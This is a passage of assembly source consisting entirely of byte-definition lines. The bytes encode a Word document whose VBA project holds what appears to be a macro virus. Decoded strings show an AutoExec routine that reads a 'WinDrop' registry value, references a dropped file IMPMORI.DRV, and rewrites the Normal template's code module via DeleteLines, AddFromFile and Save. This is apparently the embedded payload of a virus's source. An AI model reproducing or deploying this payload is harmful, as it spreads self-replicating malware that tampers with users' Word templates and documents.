    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 010h, 000h
    db 010h, 000h, 000h, 000h, 094h, 000h, 000h, 002h, 000h, 000h, 060h, 084h
    db 024h, 002h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 008h, 000h
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0f8h, 000h, 000h, 000h, 060h, 084h
    db 026h, 002h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 003h, 000h
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0b0h, 000h
    db 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 030h, 000h, 000h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0c8h, 000h, 000h, 000h, 002h, 000h
    db 002h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 030h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0b0h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 000h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 004h, 000h
    db 020h, 001h, 000h, 000h, 0d2h, 0b6h, 048h, 03ah, 014h, 000h, 0dfh, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0feh
    db 0cah, 001h, 000h, 011h, 000h, 048h, 080h, 00ch, 000h, 006h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 022h, 081h, 008h, 000h, 006h, 000h, 000h
    db 000h, 008h, 000h, 000h, 000h, 000h, 080h, 008h, 000h, 00eh, 000h, 000h
    db 000h, 010h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 02ah, 000h, 000h
    db 000h, 020h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 00eh, 000h, 000h
    db 000h, 050h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 012h, 000h, 000h
    db 000h, 060h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 012h, 000h, 000h
    db 000h, 078h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 05eh, 000h, 000h
    db 000h, 090h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 018h, 000h, 000h
    db 000h, 0f0h, 000h, 000h, 000h, 000h, 081h, 008h, 000h, 02ch, 000h, 000h
    db 000h, 008h, 001h, 000h, 000h, 000h, 081h, 008h, 000h, 036h, 000h, 000h
    db 000h, 038h, 001h, 000h, 000h, 000h, 081h, 008h, 000h, 038h, 000h, 000h
    db 000h, 070h, 001h, 000h, 000h, 000h, 081h, 008h, 000h, 00ah, 000h, 000h
    db 000h, 0a8h, 001h, 000h, 000h, 000h, 080h, 008h, 000h, 004h, 000h, 000h
    db 000h, 0b8h, 001h, 000h, 000h, 004h, 081h, 008h, 000h, 002h, 000h, 000h
    db 000h, 0c0h, 001h, 000h, 000h, 000h, 080h, 009h, 000h, 000h, 000h, 000h
    db 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 080h, 009h, 000h, 000h, 000h, 000h
    db 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 001h, 001h, 0d0h
    db 001h, 000h, 000h, 096h, 008h, 030h, 000h, 000h, 000h, 000h, 000h, 096h
    db 004h, 0b0h, 000h, 000h, 000h, 000h, 000h, 05dh, 000h, 0f2h, 004h, 0f0h
    db 000h, 000h, 000h, 0f2h, 004h, 008h, 001h, 000h, 000h, 000h, 000h, 0edh
    db 000h, 0ach, 000h, 001h, 000h, 058h, 008h, 024h, 000h, 030h, 002h, 001h
    db 000h, 024h, 000h, 02eh, 002h, 001h, 000h, 020h, 000h, 028h, 002h, 021h
    db 000h, 02ah, 002h, 025h, 000h, 02ch, 002h, 001h, 000h, 021h, 000h, 032h
    db 002h, 02eh, 000h, 018h, 000h, 065h, 074h, 074h, 069h, 06eh, 067h, 0ach
    db 000h, 0ffh, 000h, 024h, 000h, 034h, 002h, 001h, 000h, 027h, 000h, 024h
    db 002h, 000h, 000h, 020h, 000h, 024h, 002h, 0ach, 000h, 0ffh, 000h, 024h
    db 000h, 01ah, 002h, 002h, 000h, 027h, 000h, 026h, 002h, 041h, 053h, 04dh
    db 04fh, 044h, 045h, 020h, 000h, 024h, 002h, 020h, 000h, 026h, 002h, 024h
    db 020h, 0dch, 000h, 002h, 000h, 027h, 000h, 036h, 002h, 000h, 000h, 000h
    db 000h, 000h, 000h, 0b6h, 000h, 000h, 000h, 0b6h, 000h, 03ch, 000h, 048h
    db 04bh, 045h, 059h, 05fh, 04ch, 04fh, 043h, 041h, 04ch, 05fh, 04dh, 041h
    db 043h, 048h, 049h, 04eh, 045h, 05ch, 053h, 04fh, 046h, 054h, 057h, 041h
    db 052h, 045h, 05ch, 04dh, 069h, 063h, 072h, 06fh, 073h, 06fh, 066h, 074h
    db 05ch, 057h, 069h, 06eh, 064h, 06fh, 077h, 073h, 05ch, 043h, 075h, 072h
    db 072h, 065h, 06eh, 074h, 056h, 065h, 072h, 073h, 069h, 06fh, 06eh, 0b6h
    db 000h, 007h, 000h, 057h, 069h, 06eh, 044h, 072h, 06fh, 070h, 000h, 020h
    db 000h, 03ah, 002h, 025h, 000h, 03ch, 002h, 003h, 000h, 027h, 000h, 038h
    db 002h, 000h, 000h, 020h, 000h, 038h, 002h, 0b6h, 000h, 000h, 000h, 005h
    db 000h, 09bh, 000h, 047h, 000h, 020h, 000h, 036h, 002h, 027h, 000h, 038h
    db 002h, 06ah, 000h, 020h, 000h, 038h, 002h, 0b6h, 000h, 00ch, 000h, 05ch
    db 049h, 04dh, 050h, 04dh, 04fh, 052h, 049h, 02eh, 044h, 052h, 056h, 011h
    db 000h, 024h, 000h, 07eh, 000h, 001h, 000h, 0b6h, 000h, 000h, 000h, 005h
    db 000h, 09bh, 000h, 047h, 000h, 09ah, 000h, 03eh, 002h, 06ah, 000h, 000h
    db 000h, 000h, 000h, 0ach, 000h, 001h, 000h, 020h, 000h, 018h, 000h, 021h
    db 000h, 042h, 002h, 0ach, 000h, 001h, 000h, 058h, 008h, 024h, 000h, 030h
    db 002h, 001h, 000h, 024h, 000h, 02eh, 002h, 001h, 000h, 020h, 000h, 028h
    db 002h, 021h, 000h, 02ah, 002h, 025h, 000h, 02ch, 002h, 001h, 000h, 021h
    db 000h, 032h, 002h, 042h, 040h, 040h, 002h, 002h, 000h, 000h, 000h, 020h
    db 000h, 038h, 002h, 0b6h, 000h, 00ch, 000h, 05ch, 049h, 04dh, 050h, 04dh
    db 04fh, 052h, 049h, 02eh, 044h, 052h, 056h, 011h, 000h, 01dh, 000h, 0ach
    db 000h, 001h, 000h, 020h, 000h, 028h, 002h, 021h, 000h, 02ah, 002h, 021h
    db 000h, 02ch, 002h, 025h, 000h, 044h, 002h, 001h, 000h, 021h, 000h, 032h
    db 002h, 042h, 040h, 046h, 002h, 001h, 000h, 020h, 000h, 028h, 002h, 042h
    db 040h, 048h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0a3h
    db 000h, 03eh, 002h, 040h, 000h, 000h, 000h, 06fh, 000h, 0ffh, 0ffh, 038h
    db 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 030h, 000h, 000h, 000h, 0ffh
    db 0ffh, 0ffh, 0ffh, 000h, 000h, 001h, 0c3h, 0b2h, 000h, 041h, 074h, 074h
    db 072h, 069h, 062h, 075h, 074h, 000h, 065h, 020h, 056h, 042h, 05fh, 04eh
    db 061h, 06dh, 000h, 065h, 020h, 03dh, 020h, 022h, 054h, 068h, 069h, 000h
    db 073h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 010h, 074h, 022h, 00dh
    db 00ah, 00ah, 08ch, 042h, 061h, 073h, 001h, 002h, 08ch, 030h, 07bh, 030h
    db 030h, 030h, 032h, 030h, 050h, 039h, 030h, 036h, 02dh, 000h, 010h, 030h
    db 003h, 008h, 043h, 007h, 000h, 014h, 002h, 012h, 001h, 024h, 030h, 030h
    db 034h, 036h, 07dh, 081h, 00dh, 07ch, 047h, 06ch, 06fh, 062h, 061h, 06ch
    db 001h, 0d0h, 010h, 053h, 070h, 061h, 063h, 001h, 092h, 046h, 061h, 06ch
    db 004h, 073h, 065h, 00ch, 064h, 043h, 072h, 065h, 061h, 074h, 008h, 061h
    db 062h, 06ch, 015h, 01fh, 050h, 072h, 065h, 064h, 090h, 065h, 063h, 06ch
    db 061h, 000h, 006h, 049h, 064h, 000h, 0b1h, 008h, 054h, 072h, 075h, 00dh
    db 042h, 045h, 078h, 070h, 06fh, 004h, 073h, 065h, 014h, 01ch, 054h, 065h
    db 06dh, 070h, 06ch, 000h, 061h, 074h, 065h, 044h, 065h, 072h, 069h, 076h
    db 003h, 002h, 012h, 092h, 042h, 075h, 073h, 074h, 06fh, 06dh, 069h, 036h
    db 07ah, 004h, 044h, 003h, 032h, 050h, 080h, 018h, 080h, 01ch, 020h, 044h
    db 001h, 083h, 03fh, 020h, 046h, 075h, 06eh, 063h, 074h, 069h, 000h, 06fh
    db 06eh, 020h, 047h, 065h, 074h, 053h, 079h, 000h, 073h, 074h, 065h, 06dh
    db 044h, 069h, 072h, 065h, 000h, 063h, 074h, 06fh, 072h, 079h, 020h, 04ch
    db 069h, 000h, 062h, 020h, 022h, 06bh, 065h, 072h, 06eh, 065h, 000h, 06ch
    db 033h, 032h, 022h, 020h, 041h, 06ch, 069h, 010h, 061h, 073h, 020h, 022h
    db 00fh, 014h, 041h, 022h, 020h, 000h, 028h, 042h, 079h, 056h, 061h, 06ch
    db 020h, 06ch, 000h, 070h, 042h, 075h, 066h, 066h, 065h, 072h, 020h, 010h
    db 041h, 073h, 020h, 053h, 080h, 0cch, 06eh, 067h, 02ch, 082h, 020h, 083h
    db 00ch, 06eh, 053h, 069h, 07ah, 065h, 001h, 00bh, 020h, 04ch, 06fh, 06eh
    db 067h, 029h, 005h, 004h, 00dh, 00ah, 000h, 053h, 075h, 062h, 020h, 041h
    db 075h, 074h, 06fh, 000h, 045h, 078h, 065h, 063h, 028h, 029h, 00dh, 00ah
    db 060h, 044h, 069h, 06dh, 020h, 062h, 08eh, 021h, 000h, 04bh, 070h, 020h
    db 070h, 068h, 075h, 063h, 06bh, 008h, 01ch, 065h, 074h, 004h, 020h, 062h
    db 080h, 09dh, 04eh, 06fh, 072h, 06dh, 061h, 002h, 06ch, 045h, 044h, 02eh
    db 056h, 042h, 050h, 072h, 06fh, 006h, 06ah, 000h, 030h, 040h, 002h, 043h
    db 06fh, 06dh, 070h, 06fh, 002h, 06eh, 000h, 081h, 073h, 028h, 043h, 06fh
    db 073h, 028h, 000h, 041h, 074h, 06eh, 028h, 043h, 049h, 06eh, 074h, 008h
    db 028h, 031h, 029h, 000h, 000h, 02eh, 043h, 06fh, 064h, 0c0h, 065h, 04dh
    db 06fh, 064h, 075h, 06ch, 080h, 05eh, 044h, 01ch, 084h, 03dh, 020h, 042h
    db 075h, 028h, 032h, 035h, 035h, 080h, 022h, 095h, 007h, 01dh, 03dh, 050h
    db 047h, 028h, 0c3h, 00ch, 02ch, 020h, 003h, 00bh, 083h, 0c6h, 04eh, 080h
    db 024h, 04ch, 065h, 066h, 074h, 024h, 0c6h, 007h, 003h, 086h, 011h, 080h
    db 014h, 077h, 069h, 06eh, 064h, 069h, 072h, 01bh, 080h, 008h, 083h, 00bh
    db 02eh, 044h, 063h, 080h, 02ch, 066h, 069h, 06ch, 002h, 065h, 043h, 04ch
    db 028h, 022h, 022h, 02ch, 020h, 022h, 000h, 048h, 04bh, 045h, 059h, 05fh
    db 04ch, 04fh, 043h, 000h, 041h, 04ch, 05fh, 04dh, 041h, 043h, 048h, 049h
    db 000h, 04eh, 045h, 05ch, 053h, 04fh, 046h, 054h, 057h, 000h, 041h, 052h
    db 045h, 05ch, 04dh, 069h, 063h, 072h, 080h, 06fh, 073h, 06fh, 066h, 074h
    db 05ch, 057h, 0c0h, 013h, 000h, 06fh, 077h, 073h, 05ch, 043h, 075h, 072h
    db 072h, 0e1h, 0c0h, 039h, 056h, 065h, 072h, 073h, 0c0h, 072h, 0c1h, 00fh
    db 040h, 006h, 020h, 044h, 072h, 06fh, 070h, 022h, 000h, 01dh, 049h, 066h
    db 002h, 020h, 0c6h, 01dh, 022h, 022h, 020h, 054h, 068h, 065h, 066h, 06eh
    db 007h, 004h, 0c6h, 02dh, 00dh, 00ah, 0c0h, 009h, 0c0h, 07eh, 028h, 001h
    db 0c4h, 00ah, 026h, 020h, 022h, 05ch, 049h, 04dh, 050h, 000h, 04dh, 04fh
    db 052h, 049h, 02eh, 044h, 052h, 056h, 00ch, 022h, 029h, 040h, 02dh, 045h
    db 00fh, 047h, 06fh, 054h, 06fh, 040h, 020h, 06eh, 06fh, 05fh, 06dh, 061h
    db 000h, 022h, 05fh, 012h, 063h, 000h, 052h, 00dh, 00ah, 0ffh, 061h, 065h
    db 02eh, 044h, 000h, 065h, 06ch, 065h, 074h, 065h, 04ch, 069h, 06eh, 080h
    db 065h, 073h, 020h, 031h, 02ch, 020h, 062h, 0c0h, 068h, 060h, 075h, 06eh
    db 074h, 04fh, 066h, 042h, 004h, 0a4h, 018h, 02eh, 00eh, 049h, 000h, 02eh
    db 040h, 03ch, 0e8h, 03bh, 02eh, 041h, 064h, 064h, 0a0h, 046h, 072h, 06fh
    db 06dh, 046h, 060h, 02ch, 020h, 0f6h, 01bh, 031h, 0eeh, 00bh, 053h, 061h
    db 076h, 040h, 043h, 0cah, 01ch, 03ah, 00dh, 020h, 00ah, 045h, 06eh, 064h
    db 020h, 080h, 056h, 00dh, 00ah, 001h, 021h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0cch, 061h, 06dh, 000h
    db 000h, 001h, 000h, 0ffh, 01dh, 004h, 000h, 000h, 009h, 004h, 000h, 000h
    db 0e4h, 004h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 001h, 000h, 004h, 000h, 002h, 000h, 0fah, 000h, 02ah, 000h, 05ch, 000h
    db 047h, 000h, 07bh, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 032h, 000h
    db 030h, 000h, 034h, 000h, 045h, 000h, 046h, 000h, 02dh, 000h, 030h, 000h
    db 05fh, 000h, 056h, 000h, 042h, 000h, 041h, 000h, 05fh, 000h, 050h, 000h
    db 052h, 000h, 04fh, 000h, 04ah, 000h, 045h, 000h, 043h, 000h, 054h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 01ah, 000h, 002h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 027h, 000h, 000h, 000h
    db 0b5h, 009h, 000h, 000h, 000h, 000h, 000h, 000h, 064h, 000h, 069h, 000h
    db 072h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 008h, 000h, 002h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 04eh, 000h, 000h, 000h, 0c6h, 001h, 000h, 000h
    db 000h, 000h, 000h, 000h, 050h, 000h, 052h, 000h, 04fh, 000h, 04ah, 000h
    db 045h, 000h, 043h, 000h, 054h, 000h, 077h, 000h, 06dh, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 014h, 000h, 002h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 056h, 000h, 000h, 000h, 029h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 050h, 000h, 052h, 000h, 04fh, 000h, 04ah, 000h, 045h, 000h, 043h, 000h
    db 054h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 010h, 000h, 002h, 001h, 006h, 000h, 000h, 000h
    db 00ah, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 057h, 000h, 000h, 000h
    db 079h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 02dh, 000h, 043h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 034h, 000h, 036h, 000h
    db 07dh, 000h, 023h, 000h, 034h, 000h, 02eh, 000h, 030h, 000h, 023h, 000h
    db 039h, 000h, 023h, 000h, 043h, 000h, 03ah, 000h, 05ch, 000h, 050h, 000h
    db 052h, 000h, 04fh, 000h, 047h, 000h, 052h, 000h, 041h, 000h, 07eh, 000h
    db 031h, 000h, 05ch, 000h, 043h, 000h, 04fh, 000h, 04dh, 000h, 04dh, 000h
    db 04fh, 000h, 04eh, 000h, 07eh, 000h, 031h, 000h, 05ch, 000h, 04dh, 000h
    db 049h, 000h, 043h, 000h, 052h, 000h, 04fh, 000h, 053h, 000h, 07eh, 000h
    db 031h, 000h, 05ch, 000h, 056h, 000h, 042h, 000h, 041h, 000h, 05ch, 000h
    db 056h, 000h, 042h, 000h, 041h, 000h, 036h, 000h, 05ch, 000h, 056h, 000h
    db 042h, 000h, 045h, 000h, 036h, 000h, 02eh, 000h, 044h, 000h, 04ch, 000h
    db 04ch, 000h, 023h, 000h, 056h, 000h, 069h, 000h, 073h, 000h, 075h, 000h
    db 061h, 000h, 06ch, 000h, 020h, 000h, 042h, 000h, 061h, 000h, 073h, 000h
    db 069h, 000h, 063h, 000h, 020h, 000h, 046h, 000h, 06fh, 000h, 072h, 000h
    db 020h, 000h, 041h, 000h, 070h, 000h, 070h, 000h, 06ch, 000h, 069h, 000h
    db 063h, 000h, 061h, 000h, 074h, 000h, 069h, 000h, 06fh, 000h, 06eh, 000h
    db 073h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 0ech, 000h, 02ah, 000h, 05ch, 000h, 047h, 000h, 07bh, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 032h, 000h, 030h, 000h, 039h, 000h
    db 030h, 000h, 035h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 02dh, 000h, 043h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 034h, 000h, 036h, 000h
    db 07dh, 000h, 023h, 000h, 038h, 000h, 02eh, 000h, 031h, 000h, 023h, 000h
    db 030h, 000h, 023h, 000h, 044h, 000h, 03ah, 000h, 05ch, 000h, 050h, 000h
    db 072h, 000h, 06fh, 000h, 067h, 000h, 072h, 000h, 061h, 000h, 06dh, 000h
    db 05ch, 000h, 057h, 000h, 06fh, 000h, 072h, 000h, 064h, 000h, 032h, 000h
    db 06bh, 000h, 05ch, 000h, 04fh, 000h, 066h, 000h, 066h, 000h, 069h, 000h
    db 063h, 000h, 065h, 000h, 05ch, 000h, 04dh, 000h, 053h, 000h, 057h, 000h
    db 04fh, 000h, 052h, 000h, 044h, 000h, 039h, 000h, 02eh, 000h, 04fh, 000h
    db 04ch, 000h, 042h, 000h, 023h, 000h, 04dh, 000h, 069h, 000h, 063h, 000h
    db 072h, 000h, 06fh, 000h, 073h, 000h, 06fh, 000h, 066h, 000h, 074h, 000h
    db 020h, 000h, 057h, 000h, 06fh, 000h, 072h, 000h, 064h, 000h, 020h, 000h
    db 039h, 000h, 02eh, 000h, 030h, 000h, 020h, 000h, 04fh, 000h, 062h, 000h
    db 06ah, 000h, 065h, 000h, 063h, 000h, 074h, 000h, 020h, 000h, 04ch, 000h
    db 069h, 000h, 062h, 000h, 072h, 000h, 061h, 000h, 072h, 000h, 079h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 0b8h, 000h, 02ah, 000h, 05ch, 000h, 047h, 000h, 07bh, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 032h, 000h, 030h, 000h, 034h, 000h, 033h, 000h
    db 030h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 02dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h
    db 043h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02dh, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
    db 030h, 000h, 030h, 000h, 030h, 000h, 034h, 000h, 036h, 000h, 07dh, 000h
    db 023h, 000h, 032h, 000h, 02eh, 000h, 030h, 000h, 023h, 000h, 030h, 000h
    db 023h, 000h, 043h, 000h, 03ah, 000h, 05ch, 000h, 057h, 000h, 049h, 000h
    db 04eh, 000h, 032h, 000h, 04bh, 000h, 05ch, 000h, 053h, 000h, 079h, 000h
    db 073h, 000h, 074h, 000h, 065h, 000h, 06dh, 000h, 033h, 000h, 032h, 000h
    db 05ch, 000h, 073h, 000h, 074h, 000h, 064h, 000h, 06fh, 000h, 06ch, 000h
    db 065h, 000h, 032h, 000h, 02eh, 000h, 074h, 000h, 06ch, 000h, 062h, 000h
    db 023h, 000h, 04fh, 000h, 04ch, 000h, 045h, 000h, 020h, 000h, 041h, 000h
    db 075h, 000h, 074h, 000h, 06fh, 000h, 06dh, 000h, 061h, 000h, 074h, 000h
    db 069h, 000h, 06fh, 000h, 06eh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0eah, 000h, 02ah, 000h, 05ch, 000h
    db 047h, 000h, 07bh, 000h, 032h, 000h, 044h, 000h, 046h, 000h, 038h, 000h
    db 044h, 000h, 030h, 000h, 034h, 000h, 043h, 000h, 02dh, 000h, 035h, 000h
    db 042h, 000h, 046h, 000h, 041h, 000h, 02dh, 000h, 031h, 000h, 030h, 000h
    db 031h, 000h, 042h, 000h, 02dh, 000h, 042h, 000h, 044h, 000h, 045h, 000h
    db 035h, 000h, 02dh, 000h, 030h, 000h, 030h, 000h, 041h, 000h, 041h, 000h
    db 030h, 000h, 030h, 000h, 034h, 000h, 034h, 000h, 044h, 000h, 045h, 000h
    db 035h, 000h, 032h, 000h, 07dh, 000h, 023h, 000h, 032h, 000h, 02eh, 000h
    db 031h, 000h, 023h, 000h, 030h, 000h, 023h, 000h, 044h, 000h, 03ah, 000h
    db 05ch, 000h, 050h, 000h, 072h, 000h, 06fh, 000h, 067h, 000h, 072h, 000h
    db 061h, 000h, 06dh, 000h, 05ch, 000h, 057h, 000h, 06fh, 000h, 072h, 000h
    db 064h, 000h, 032h, 000h, 06bh, 000h, 05ch, 000h, 04fh, 000h, 066h, 000h
    db 066h, 000h, 069h, 000h, 063h, 000h, 065h, 000h, 05ch, 000h, 04dh, 000h
    db 053h, 000h, 04fh, 000h, 039h, 000h, 02eh, 000h, 044h, 000h, 04ch, 000h
    db 04ch, 000h, 023h, 000h, 04dh, 000h, 069h, 000h, 063h, 000h, 072h, 000h
    db 06fh, 000h, 073h, 000h, 06fh, 000h, 066h, 000h, 074h, 000h, 020h, 000h
    db 04fh, 000h, 066h, 000h, 066h, 000h, 069h, 000h, 063h, 000h, 065h, 000h
    db 020h, 000h, 039h, 000h, 02eh, 000h, 030h, 000h, 020h, 000h, 04fh, 000h
    db 062h, 000h, 06ah, 000h, 065h, 000h, 063h, 000h, 074h, 000h, 020h, 000h
    db 04ch, 000h, 069h, 000h, 062h, 000h, 072h, 000h, 061h, 000h, 072h, 000h
    db 079h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 001h, 000h, 002h, 000h, 004h, 000h, 004h, 002h, 000h, 000h
    db 006h, 002h, 001h, 000h, 008h, 002h, 000h, 000h, 00ah, 002h, 001h, 000h
    db 010h, 002h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 0ffh, 0ffh, 000h, 000h, 0d2h, 0b6h, 048h, 03ah, 014h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 03bh, 077h
